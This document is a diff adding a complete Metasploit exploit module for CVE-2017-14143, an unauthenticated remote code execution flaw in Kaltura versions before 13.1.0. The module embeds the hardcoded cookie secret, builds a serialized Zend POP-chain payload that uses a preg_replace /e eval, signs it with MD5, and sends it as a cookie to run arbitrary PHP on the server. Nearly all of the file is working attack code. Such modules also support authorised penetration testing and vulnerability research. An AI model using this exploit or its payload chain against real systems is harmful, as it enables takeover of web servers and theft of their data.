@@ -1,0 +1,146 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  CookieSecret = 'y3tAno3therS$cr3T'
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Kaltura Remote PHP Code Execution over Cookie',
+      'Description'    => %q{
+        This module exploits an Object Injection vulnerability in Kaltura.
+        By exploiting this vulnerability, unauthenticated users can execute
+        arbitrary code under the context of the web server user.
+
+        Kaltura makes use of a hardcoded cookie secret which allows to sign
+        arbitrary cookie data. After passing this signature check, the base64-
+        decoded data is passed to PHPs unserialize() function which allows for
+        code execution. The constructed object is again based on the SektionEins
+        Zend code execution POP chain PoC. Kaltura versions prior to 13.1.0 are
+        affected by this issue.
+
+        A valid entry_id (which is required for this exploit) can be obtained
+        from any media resource published on the kaltura installation.
+
+        This module was tested against Kaltura 13.1.0-2 installed on Ubuntu 14.04.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Robin Verton <hello@robinverton.de>',
+          'Mehmet Ince <mehmet@mehmetince.net>' # first kaltura rce module
+        ],
+      'References'      =>
+        [
+          ['CVE', '2017-14143']
+        ],
+      'Privileged'      => false,
+      'Platform'        => ['php'],
+      'Arch'            => ARCH_PHP,
+      'Targets'         => [ ['Automatic', {}] ],
+      'DisclosureDate'  => 'Sep 12 2017',
+      'DefaultTarget'   => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The target URI of the Kaltura installation', '/']),
+        OptString.new('ENTRYID', [true, 'Valid entry ID of any media resource (example: 0_lahha4c9)', ''])
+      ]
+    )
+  end
+
+  def check
+    r = rand_text_alpha(15 + rand(4))
+    entry_id = datastore['ENTRYID']
+    cmd = "print_r(#{r}).die()"
+
+    p = ""
+    p << "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";"
+    p << "a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\00*\00_eventsToMail\";"
+    p << "a:1:{i:0;i:1;}s:22:\"\00*\00_layoutEventsToMail\";a:0:{}s:8:\"\00*\00_mail\";"
+    p << "O:9:\"Zend_Mail\":0:{}s:10:\"\00*\00_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\00*\00_inflector\";"
+    p << "O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\00*\00_matchPattern\";s:7:\"/(.*)/e\";"
+    p << "s:15:\"\00*\00_replacement\";s:#{cmd.length.to_s}:\"#{cmd}\";}s:20:\"\00*\00_inflectorEnabled\";"
+    p << "b:1;s:10:\"\00*\00_layout\";s:6:\"layout\";}s:22:\"\00*\00_subjectPrependText\";N;}}};}"
+
+    encoded = Rex::Text.encode_base64(p)
+    hash = Rex::Text.md5("#{encoded}#{CookieSecret}")
+
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'index.php', 'keditorservices', 'getAllEntries'),
+      'vars_get' => {
+        'list_type' => '15',
+        'entry_id' => entry_id
+      },
+      'cookie' => "userzone=#{encoded}#{hash}"
+    )
+
+    if res && res.redirect?
+      print_error("Got a redirect, maybe you are not using https? #{res.headers['Location']}")
+      Exploit::CheckCode::Safe
+    elsif res && res.body.include?(r)
+      Exploit::CheckCode::Vulnerable
+    elsif !check_entryid
+      print_error("Invalid ENTRYID")
+      Exploit::CheckCode::Safe
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def check_entryid
+    entry_id = datastore['ENTRYID']
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'index.php', 'keditorservices', 'getAllEntries'),
+      'vars_get' => {
+        'list_type' => '15',
+        'entry_id' => entry_id
+      }
+    )
+
+    return res.body.include? entry_id
+  end
+
+  def exploit
+    entry_id = datastore['ENTRYID']
+    cmd = "print_r(eval(base64_decode('#{Rex::Text.encode_base64(payload.encode)}'))).die()"
+
+    p = ""
+    p << "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";"
+    p << "a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\00*\00_eventsToMail\";"
+    p << "a:1:{i:0;i:1;}s:22:\"\00*\00_layoutEventsToMail\";a:0:{}s:8:\"\00*\00_mail\";"
+    p << "O:9:\"Zend_Mail\":0:{}s:10:\"\00*\00_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\00*\00_inflector\";"
+    p << "O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\00*\00_matchPattern\";s:7:\"/(.*)/e\";"
+    p << "s:15:\"\00*\00_replacement\";s:#{cmd.length.to_s}:\"#{cmd}\";}s:20:\"\00*\00_inflectorEnabled\";"
+    p << "b:1;s:10:\"\00*\00_layout\";s:6:\"layout\";}s:22:\"\00*\00_subjectPrependText\";N;}}};}"
+
+    encoded = Rex::Text.encode_base64(p)
+    hash = Rex::Text.md5("#{encoded}#{CookieSecret}")
+
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'index.php', 'keditorservices', 'getAllEntries'),
+      'vars_get' => {
+        'list_type' => '15',
+        'entry_id' => entry_id
+      },
+      'cookie' => "userzone=#{encoded}#{hash}"
+    )
+
+    if res && res.redirect?
+      print_error("Got a redirect, maybe you are not using https? #{res.headers['Location']}")
+    elsif res && res.code != 200
+      print_error('Unexpected response...')
+    else
+      print_status("Output: #{res.body}")
+    end
+  end
+end
